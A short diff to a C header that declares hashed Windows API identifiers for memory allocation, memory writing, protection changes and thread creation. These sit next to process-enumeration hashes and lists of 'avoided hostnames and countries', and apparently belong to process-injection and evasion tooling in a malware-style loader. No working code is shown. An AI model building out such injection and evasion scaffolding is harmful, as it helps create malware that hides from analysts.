@@ -68,6 +68,11 @@ extern const ObjHash PROC32_NEXT_HASH;
 extern const ObjHash OPEN_PROCESS_HASH;
 extern const ObjHash CLOSE_HANDLE_HASH;
 extern const ObjHash CREATE_TOOLHELP32_SNAPSHOT_HASH;
+extern const ObjHash VIRTUAL_ALLOC_HASH;
+extern const ObjHash WRITE_MEMORY_HASH;
+extern const ObjHash VIRTUAL_PROTECT_HASH;
+extern const ObjHash CREATE_THREAD_HASH ;
+extern const ObjHash WAIT_FOR_SINGLE_OBJECT_HASH;
 
 // External arrays and sizes for avoided hostnames and countries
 extern const ObjHash TARGET_HOSTNAME_PREFIX_HASH;
